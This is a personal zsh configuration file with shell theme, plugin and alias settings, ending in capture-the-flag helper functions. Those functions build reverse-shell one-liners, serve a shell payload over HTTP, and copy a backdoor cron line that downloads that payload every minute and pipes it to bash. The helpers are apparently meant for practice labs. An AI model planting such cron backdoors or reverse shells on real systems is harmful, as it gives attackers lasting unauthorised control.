export ZSH="$HOME/.oh-my-zsh"
export PATH="$HOME/.local/bin:$PATH"

ZSH_THEME="agnoster"

plugins=(
  git
  themes
  alias-finder
  cp
  gitfast
  sudo
  vi-mode
  vscode
  archlinux
  ubuntu
  zsh-autosuggestions
  zsh-syntax-highlighting
)

ZSH_AUTOSUGGEST_STRATEGY=(history completion)
ZSH_AUTOSUGGEST_USE_ASYNC=1

source $ZSH/oh-my-zsh.sh

typeset -gA ZSH_HIGHLIGHT_STYLES

ZSH_HIGHLIGHT_STYLES[arg0]=fg=4
ZSH_HIGHLIGHT_STYLES[command]=fg=4
ZSH_HIGHLIGHT_STYLES[alias]=fg=4
ZSH_HIGHLIGHT_STYLES[suffix-alias]=fg=4
ZSH_HIGHLIGHT_STYLES[precommand]=fg=4,bold
ZSH_HIGHLIGHT_STYLES[builtin]=fg=6,bold
ZSH_HIGHLIGHT_STYLES[default]=fg=12
ZSH_HIGHLIGHT_STYLES[path]=fg=12
ZSH_HIGHLIGHT_STYLES[single-hyphen-option]=fg=5
ZSH_HIGHLIGHT_STYLES[double-hyphen-option]=fg=208,bold
ZSH_HIGHLIGHT_STYLES[assign]=fg=14

# Fix slow pasting with zsh-autosuggest
zstyle ':bracketed-paste-magic' active-widgets '.self-*'

export EDITOR='vim'

# Kernel build variables
export MAKEFLAGS="-j$(nproc)"
lscpu | grep "AMD Ryzen 5 3600" >/dev/null &&
  export _microarchitecture=14;

# general Aliases
alias btop="bpytop"
alias r="ranger"
alias tmux="tmux -2"
alias cp="cpv -iv"
alias mv="mv -iv"
alias rm="rm -v"

alias updaterc="wget https://raw.githubusercontent.com/Gobidev/dotfiles/main/.zshrc -O ~/.zshrc &>/dev/null && echo 'Update successful'"

# wireguard aliases
alias wg0="sudo systemctl stop wg-quick@wg1 && sudo systemctl start wg-quick@wg0"
alias wg1="sudo systemctl stop wg-quick@wg0 && sudo systemctl start wg-quick@wg1"

# clipboard aliases
command -v xclip >/dev/null && { alias setclip="xclip -selection c" && alias getclip="xclip -selection c -o" }
command -v wl-copy >/dev/null && { alias setclip="wl-copy" && alias getclip="wl-paste" }

# ctf aliases
ctf_interface="tun0"

rs() {
  if [[ "$1" != "" ]]; then
    tip="$1"
  fi
  rustscan -b 2000 --ulimit 5000 -a "$tip" -- -A | tee rustscan.log
}

grip() {
  grep -o -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' $1
}

getip() {
  echo "$(ip a s $ctf_interface | grip)"
}

cpip() {
  getip | setclip
}

newctf() {
  target_name="$1"
  target_name_upper="$(tr '[:lower:]' '[:upper:]' <<< ${target_name:0:1})${target_name:1}"
  tip="$2"
  my_ip="$(getip)"

  mkdir "$target_name" && cd "$target_name"
  echo "# $target_name_upper\n\nMy IP:         $my_ip\nTarget IP:     $tip\n\n" > notes.md
  echo "$tip" > target_ip
  code .
}

sett() {
  tip="$1"
  echo "$tip" > target_ip
}

gett() {
  echo "$tip"
  echo "$tip" | setclip
}

genrev() {
  if [[ "$2" != "" ]]; then
    rev_port="$2"
  else
    rev_port="9999"
  fi
  echo "$(pms -i $(getip) -p $rev_port -s -t $1)"
}

genrevc() {
  revshell="$(genrev $@)"
  echo "$revshell" && echo "$revshell" | setclip
}

revpayload() {
  echo "#!/bin/sh\n$(genrev $@)" > payload
  python -m http.server
}

bdcron() {
  echo "* * * * * /usr/bin/wget -O- http://$(getip):8000/payload | /bin/bash" | setclip
}

alias gob="gobuster dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -o gobuster.log -u"
alias ferb="feroxbuster -o feroxbuster.log -u"
alias nik="nikto -o '$(pwd)'/nikto_log.txt -h"
alias up="python -m http.server"

gobt() { gob "$tip" }
ferbt() { ferb http://"$tip" }
nikt() { nik "$tip" }
pnt() { ping "$tip" }

if test -f target_ip; then
  tip="$(cat target_ip)"
fi

# pfetch
echo
pfetch
